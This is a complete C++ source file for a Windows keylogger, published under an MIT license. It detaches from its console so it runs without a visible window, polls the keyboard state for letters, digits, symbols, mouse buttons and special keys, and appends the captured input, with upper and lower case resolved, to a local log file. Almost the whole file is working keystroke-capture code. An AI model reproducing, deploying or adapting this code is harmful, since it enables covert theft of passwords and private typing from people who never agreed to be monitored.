/*  
 * MIT License 
 *
 * Copyright 2017 Marios Sofokleous
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
 * copies of the Software, and to permit persons to whom the Software is 
 * furnished to do so, subject to the following conditions:
 
 * The above copyright notice and this permission notice shall be included in 
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
 * SOFTWARE.
 *
 * /////////////////////////////////////////////////////////////////////////////
 * 
 * Name: keylogger.cpp
 *
 * Description: A basic Windows-only keylogger (US standard keyboard)
 *
 * Sources:
 *   1. GetAsyncKeyState function: https://msdn.microsoft.com/en-us/library/
 *   windows/desktop/ms646293(v=vs.85).aspx
 *   2. Virtual-Key Codes: https://msdn.microsoft.com/en-us/library/windows/
 *   desktop/dd375731(v=vs.85).aspx
 *   3. Keyboard Layout Charts: kbd-intl.narod.ru/english/layouts
 *
 * Notes:
 *   1. GetAsyncKeyState() can't tell the difference between upper and lower 
 *   case letters. We would need to take SHIFT and CAPSLOCK into account in 
 *   order to determine case.
 *   2. The keylogger is intended for US standard keyboards. Code changes are
 *   necessary for other Latin keyboard layouts.
 */

#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>

int log1(int, const char *);
int log2(int, const char *);
int log3(int, const char *);

// Maximum number of keys to record
const int max = 100;
// CAPSLOCK state
bool IsCapsLockUp;

int main() {
	// Detach program from its console
	FreeConsole();

	// Check CAPSLOCK state
	if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		IsCapsLockUp = true;
	else
		IsCapsLockUp = false;

	int count = 0;
	while(count < max) {
		// Group #1 (SHIFT and CAPSLOCK keys have to be taken into consideration)

		// 65: <Aa>, 66: <Bb>, ..., 90: <Zz>
		for(int key = 65; key < 91; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log1(key, "log.txt");
			}
		}

		// Group #2 (Only the SHIFT key has to be taken into consideration) 

		// 48: <0)>, 49: <1!>, ..., 57: <9(>
		for(int key = 48; key < 58; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log2(key, "log.txt");
			}
		}

		/* 
		 * 186: <;:>, 187: <=+>, 188: <,<>, 189: <-_>, 190: <.>>, 191: </?>, 
		 * 192: <`~>
		 */
		for(int key = 186; key < 193; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log2(key, "log.txt");
			}
		}

		// 219: <[{>, 220: <\|>, 221: <]}>, 222: <'">
		for(int key = 219; key < 223; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log2(key, "log.txt");
			}
		}

		// Group #3 (SHIFT and CAPSLOCK keys needn't be taken into consideration)

		// 1: LMB
		if(GetAsyncKeyState(1) == -32767) {
			count++;
			log3(1, "log.txt");
		}

		// 2: RMB
		if(GetAsyncKeyState(2) == -32767) {
			count++;
			log3(2, "log.txt");
		}

		// 4: MMB
		if(GetAsyncKeyState(4) == -32767) {
			count++;
			log3(4, "log.txt");
		}

		// 8: BACK, 9: TAB
		for(int key = 8; key < 10; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		// 13: ENTER
		if(GetAsyncKeyState(13) == -32767) {
			count++;
			log3(13, "log.txt");
		}

		// 16: SHIFT
		if(GetAsyncKeyState(16) == -32767) {
			count++;
			log3(16, "log.txt");
		}

		// 20: CAPSLOCK
		if(GetAsyncKeyState(20) == -32767) {
			count++;
			log3(20, "log.txt");
		}

		// 27: ESC
		if(GetAsyncKeyState(27) == -32767) {
			count++;
			log3(27, "log.txt");
		}

		/*
		 * 32: SPACE, 33: PGUP, 34: PGDN, 35: END, 36: HOME, 37: ARROWL, 38: ARROWU, 
		 * 39: ARROWR, 40: ARROWD
		 */
		for(int key = 32; key < 41; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		// 45: INS, 46: DEL
		for(int key = 45; key < 47; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		// 91: LWIN, 92: RWIN, 93: MENU
		for(int key = 91; key < 94; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		// 112: F1, 113: F2, ..., 123: F12
		for(int key = 112; key < 124; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		// 162: LCTRL, 163: RCTRL, 164: LALT, 165: RALT
		for(int key = 162; key < 166; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}
	}
	return 0;
}

/*
 * Encompassing the following characters (US standard keyboard):
 * a b c d e f g h i j k l m n o p q r s t u v w x y z
 * A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
 *
 * Notes:
 *  1. {Q, W, Y, A, Z, M} keys are not the same for every Latin keyboard layout.
 * 	2. {A, B, ..., Z}-{Q, W, Y, A, Z, M} keys are the same for every Latin 
 *	keyboard layout.
 */
int log1(int key, const char *filename) {
	
	std::ofstream out_file(filename, std::ofstream::out | std::ofstream::app);
	
	if(out_file.is_open()) {
		// Case #1: SHIFT down, CAPSLOCK down
		if((!GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == false)) {
			//lower case
			key+=32;
			out_file << char (key);
		}
		// Case #2: SHIFT up, CAPSLOCK up
		else if((GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == true)) {
			// Lower case
			key+=32;
			out_file << char (key);
		}
		/*
		 * Case #3: SHIFT down, CAPSLOCK up
		 * Case #4: SHIFT up, CAPSLOCK down
		 */
		else {
			// Upper case
			out_file << char (key);
		}
		out_file.close();
		// Success
		return 0;
	}
	else {
		// Failure
		return 1;
	}
}

/*
 * Encompassing the following characters (US standard keyboard):
 * 0 1 2 3 4 5 6 7 8 9 ; = , - . / ` [ \ ] '
 * ) ! @ # $ % ^ & * ( : + < _ > ? ~ { | } "
 *
 * Notes:
 *  1. {;, =, -, /, `, [, \, ], '} keys are not the same for every Latin 
 *	keyboard layout.
 * 	2. {0, 1, 2, 3, 4, 5, 6, 7, 8, 9} keys are the same for every Latin 
 *	keyboard layout.
 */
int log2(int key, const char *filename) {

	std::ofstream out_file(filename, std::ofstream::out | std::ofstream::app);

	if(out_file.is_open()) {
		// Take 'SHIFT' key into account
		if(!GetAsyncKeyState(VK_SHIFT)) {
			switch(key) {
				// It can vary by keyboard.
				case 186: out_file << ";"; break;
				// It can vary by keyboard.
				case 187: out_file << "="; break;
				// For any country/region.
				case 188: out_file << ","; break;
				// It can vary by keyboard.
				case 189: out_file << "-"; break;
				// For any country/region.
				case 190: out_file << "."; break;
				// It can vary by keyboard.
				case 191: out_file << "/"; break;
				// It can vary by keyboard.
				case 192: out_file << "`"; break;
				// It can vary by keyboard.
				case 219: out_file << "["; break;
				// It can vary by keyboard.
				case 220: out_file << "\\"; break;
				// It can vary by keyboard.
				case 221: out_file << "]"; break;
				// It can vary by keyboard.
				case 222: out_file << "\'"; break;
				// 0 1 2 3 4 5 6 7 8 9 (For any country/region)
				default: out_file << char (key);
			}
		}
		else {
			switch(key) {
				// It can vary by keyboard.
				case 48: out_file << ")"; break;
				// It can vary by keyboard.
				case 49: out_file << "!"; break;
				// It can vary by keyboard.
				case 50: out_file << "@"; break;
				// It can vary by keyboard.
				case 51: out_file << "#"; break;
				// It can vary by keyboard.
				case 52: out_file << "$"; break;
				// It can vary by keyboard.
				case 53: out_file << "%"; break;
				// It can vary by keyboard.
				case 54: out_file << "^"; break;
				// It can vary by keyboard.
				case 55: out_file << "&"; break;
				// It can vary by keyboard.
				case 56: out_file << "*"; break;
				// It can vary by keyboard.
				case 57: out_file << "("; break;
				// It can vary by keyboard.
				case 186: out_file << ":"; break;
				// It can vary by keyboard.
				case 187: out_file << "+"; break;
				// It can vary by keyboard.
				case 188: out_file << "<"; break;
				// It can vary by keyboard.
				case 189: out_file << "_"; break;
				// It can vary by keyboard.
				case 190: out_file << ">"; break;
				// It can vary by keyboard.
				case 191: out_file << "\?"; break;
				// It can vary by keyboard.
				case 192: out_file << "~"; break;
				// It can vary by keyboard.
				case 219: out_file << "{"; break;
				// It can vary by keyboard.
				case 220: out_file << "|"; break;
				// It can vary by keyboard.
				case 221: out_file << "}"; break;
				// It can vary by keyboard.
				case 222: out_file << "\""; break;
			}
		}
		out_file.close();
		// Success
		return 0;
	}
	else {
		// Failure
		return 1;
	}
}

/**
 * Encompassing the following characters (US standard keyboard):
 * [LMB] [RMB] [MMB] [BACK] [TAB] [ENTER\n] [SHIFT] [CAP0] [CAP1] [ESC] [SPACE ] 
 * [PGUP] [PGDN] [END] [HOME] [ARROWL] [ARROWU] [ARROWR] [ARROWD] [INS] [DEL] 
 * [LWIN] [RWIN] [MENU] [F1-F12] [LCTRL] [RCTRL] [LALT] [RALT]
 */
int log3(int key, const char *filename) {

	std::ofstream out_file(filename, std::ofstream::out | std::ofstream::app);

	if(out_file.is_open()) {
		switch(key) {
			// Left Mouse Buttton
			case VK_LBUTTON: out_file << "[LMB]"; break;
			// Right Mouse Buttton
			case VK_RBUTTON: out_file << "[RMB]"; break;
			// Middle Mouse Buttton
			case VK_MBUTTON: out_file << "[MMB]"; break;
			// Backspace
			case VK_BACK: out_file << "[BACK]"; break;
			// Tab
			case VK_TAB: out_file << "[TAB]"; break;
			// Enter
			case VK_RETURN: out_file << "[ENTER]\n"; break;
			/*
			// Shift
			case VK_SHIFT: out_file << "[SHIFT]"; break;
			*/
			// Update CAPSLOCK state
			case VK_CAPITAL:
				if(IsCapsLockUp == true) {
					// C0 = CAPSLOCK Down
					out_file << "[CAP0]";
					IsCapsLockUp = false;
				}
				else {
					// C1 = CAPSLOCK Up
					out_file << "[CAP1]";
					IsCapsLockUp = true;
				}
				break;
			// Escape
			case VK_ESCAPE: out_file << "[ESC]"; break;
			// Spacebar
			case VK_SPACE: out_file << "[SPACE] "; break;
			// Page Up
			case VK_PRIOR: out_file << "[PGUP]"; break;
			// Page Down
			case VK_NEXT: out_file << "[PGDN]"; break;
			// End
			case VK_END: out_file << "[END]"; break;
			// Home
			case VK_HOME: out_file << "[HOME]"; break;
			// Left Arrow
			case VK_LEFT: out_file << "[ARROWL]"; break;
			// Up Arrow
			case VK_UP: out_file << "[ARROWU]"; break;
			// Right Arrow
			case VK_RIGHT: out_file << "[ARROWR]"; break;
			// Down Arrow
			case VK_DOWN: out_file << "[ARROWD]"; break;
			// Insert
			case VK_INSERT: out_file << "[INS]"; break;
			// Delete
			case VK_DELETE: out_file << "[DEL]"; break;
			// Left Windows
			case VK_LWIN: out_file << "[LWIN]"; break;
			// Right Windows
			case VK_RWIN: out_file << "[RWIN]"; break;
			// Application/Menu
			case VK_APPS: out_file << "[MENU]"; break;
			// Function keys
			case VK_F1: out_file << "[F1]"; break;
			case VK_F2: out_file << "[F2]"; break;
			case VK_F3: out_file << "[F3]"; break;
			case VK_F4: out_file << "[F4]"; break;
			case VK_F5: out_file << "[F5]"; break;
			case VK_F6: out_file << "[F6]"; break;
			case VK_F7: out_file << "[F7]"; break;
			case VK_F8: out_file << "[F8]"; break;
			case VK_F9: out_file << "[F9]"; break;
			case VK_F10: out_file << "[F10]"; break;
			case VK_F11: out_file << "[F11]"; break;
			case VK_F12: out_file << "[F12]"; break;
			// Left Control 
			case VK_LCONTROL: out_file << "[LCTRL]"; break;
			// Right Control 
			case VK_RCONTROL: out_file << "[RCTRL]"; break;
			// Left Alternate
			case VK_LMENU: out_file << "[LALT]"; break;
			// Right Alternate
			case VK_RMENU: out_file << "[RALT]"; break; 
		}
		out_file.close();
		// Success
		return 0;
	}
	else {
		// Failure
		return 1;
	}
}